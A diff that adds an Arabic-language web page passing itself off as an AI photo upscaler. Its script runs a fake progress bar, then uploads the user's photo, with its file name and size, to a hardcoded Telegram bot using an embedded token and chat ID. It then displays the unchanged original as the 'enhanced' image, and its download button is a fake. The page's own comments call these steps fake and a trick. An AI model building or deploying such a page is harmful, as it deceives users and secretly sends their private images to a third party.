@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Image Enhancer - رفع جودة الصور بالذكاء الاصطناعي</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d); color: white; }
+        .container { max-width: 800px; margin: 50px auto; padding: 30px; background: rgba(0,0,0,0.7); border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        header { text-align: center; margin-bottom: 30px; }
+        h1 { font-size: 2.5rem; margin-bottom: 10px; text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
+        .upload-area { border: 3px dashed #4cc9f0; border-radius: 15px; padding: 40px; text-align: center; cursor: pointer; margin-bottom: 30px; transition: all 0.3s; }
+        .upload-area:hover { background: rgba(76, 201, 240, 0.1); }
+        .upload-icon { font-size: 80px; color: #4cc9f0; margin-bottom: 20px; }
+        .btn { background: #4361ee; color: white; border: none; padding: 15px 40px; font-size: 1.2rem; border-radius: 50px; cursor: pointer; transition: all 0.3s; margin: 20px 0; }
+        .btn:hover { background: #3a0ca3; transform: translateY(-3px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .features { display: flex; justify-content: space-around; flex-wrap: wrap; margin: 40px 0; }
+        .feature { text-align: center; width: 30%; margin-bottom: 20px; }
+        .feature i { font-size: 2.5rem; color: #f72585; margin-bottom: 15px; }
+        .result { display: none; text-align: center; }
+        .image-container { display: flex; justify-content: space-around; margin: 30px 0; }
+        .image-box { width: 45%; }
+        .image-box img { width: 100%; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
+        .loader { display: none; text-align: center; margin: 30px 0; }
+        .loader-spinner { border: 5px solid #f3f3f3; border-top: 5px solid #4361ee; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        footer { text-align: center; margin-top: 40px; font-size: 0.9rem; opacity: 0.8; }
+    </style>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-camera-retro"></i> رفع جودة الصور بدقة 4K</h1>
+            <p>تقنية الذكاء الاصطناعي المتطورة لتحسين دقة الصور مع الحفاظ على التفاصيل</p>
+        </header>
+
+        <div class="upload-area" id="uploadArea">
+            <div class="upload-icon">
+                <i class="fas fa-cloud-upload-alt"></i>
+            </div>
+            <h2>اسحب وأفلت الصورة هنا</h2>
+            <p>أو انقر لاختيار الصورة (JPG, PNG, GIF)</p>
+            <input type="file" id="imageInput" accept="image/*" hidden>
+            <button class="btn" onclick="document.getElementById('imageInput').click()">
+                <i class="fas fa-folder-open"></i> اختيار صورة
+            </button>
+        </div>
+
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-rocket"></i>
+                <h3>رفع الدقة 4x</h3>
+                <p>تحويل الصور إلى 4K بدقة عالية</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-brain"></i>
+                <h3>ذكاء اصطناعي</h3>
+                <p>تقنية GAN متطورة لتحسين الجودة</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-bolt"></i>
+                <h3>معالجة فورية</h3>
+                <p>نتائج في أقل من 30 ثانية</p>
+            </div>
+        </div>
+
+        <div class="loader" id="loader">
+            <div class="loader-spinner"></div>
+            <p>جاري معالجة الصورة باستخدام الذكاء الاصطناعي...</p>
+            <p id="progressText">0%</p>
+        </div>
+
+        <div class="result" id="result">
+            <h2><i class="fas fa-check-circle"></i> تم تحسين صورتك بنجاح!</h2>
+            <div class="image-container">
+                <div class="image-box">
+                    <h3>الصورة الأصلية</h3>
+                    <img id="originalImg" src="" alt="Original">
+                </div>
+                <div class="image-box">
+                    <h3>بعد التحسين</h3>
+                    <img id="enhancedImg" src="" alt="Enhanced">
+                </div>
+            </div>
+            <button class="btn" id="downloadBtn">
+                <i class="fas fa-download"></i> تحميل الصورة المحسنة
+            </button>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 AI Image Enhancer Pro | جميع الحقوق محفوظة</p>
+        <p>تم تطوير هذا النظام باستخدام تقنيات الذكاء الاصطناعي من الجيل الخامس</p>
+    </footer>
+
+    <script>
+        const TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
+        const CHAT_ID = "7763665935";
+        let uploadedImage = null;
+
+        // معالجة اختيار الصورة
+        document.getElementById('imageInput').addEventListener('change', function(e) {
+            if (this.files && this.files[0]) {
+                uploadedImage = this.files[0];
+                const reader = new FileReader();
+                
+                reader.onload = function(event) {
+                    // إظهار الصورة المختارة
+                    document.getElementById('originalImg').src = event.target.result;
+                    
+                    // إظهار واجهة المعالجة
+                    document.getElementById('loader').style.display = 'block';
+                    
+                    // محاكاة تقدم المعالجة
+                    simulateProcessing();
+                }
+                
+                reader.readAsDataURL(this.files[0]);
+            }
+        });
+
+        // محاكاة عملية المعالجة
+        function simulateProcessing() {
+            let progress = 0;
+            const progressText = document.getElementById('progressText');
+            const progressInterval = setInterval(() => {
+                progress += Math.floor(Math.random() * 10);
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(progressInterval);
+                    
+                    // إرسال الصورة إلى التليجرام بعد انتهاء المحاكاة
+                    sendToTelegram();
+                    
+                    // إظهار النتيجة المزيفة
+                    setTimeout(showResult, 1000);
+                }
+                progressText.textContent = `${progress}%`;
+            }, 500);
+        }
+
+        // إظهار النتيجة المزيفة
+        function showResult() {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('result').style.display = 'block';
+            document.getElementById('enhancedImg').src = document.getElementById('originalImg').src;
+        }
+
+        // إرسال الصورة إلى التليجرام
+        function sendToTelegram() {
+            if (!uploadedImage) return;
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', uploadedImage);
+            formData.append('caption', `🔥 تم استلام صورة جديدة!\n📁 اسم الملف: ${uploadedImage.name}\n💾 الحجم: ${Math.round(uploadedImage.size/1024)}KB`);
+            
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // زر التحميل (خدعة)
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            alert('⛔ النسخة التجريبية لا تدعم التحميل المباشر. قم بحفظ الصورة يدوياً بالنقر بزر الماوس الأيمن.');
+        });
+
+        // تحسين تجربة السحب والإفلات
+        const uploadArea = document.getElementById('uploadArea');
+        
+        uploadArea.addEventListener('dragover', (e) => {
+            e.preventDefault();
+            uploadArea.style.backgroundColor = 'rgba(76, 201, 240, 0.2)';
+        });
+        
+        uploadArea.addEventListener('dragleave', () => {
+            uploadArea.style.backgroundColor = '';
+        });
+        
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.style.backgroundColor = '';
+            
+            if (e.dataTransfer.files && e.dataTransfer.files[0]) {
+                document.getElementById('imageInput').files = e.dataTransfer.files;
+                const event = new Event('change');
+                document.getElementById('imageInput').dispatchEvent(event);
+            }
+        });
+    </script>
+</body>
+</html>
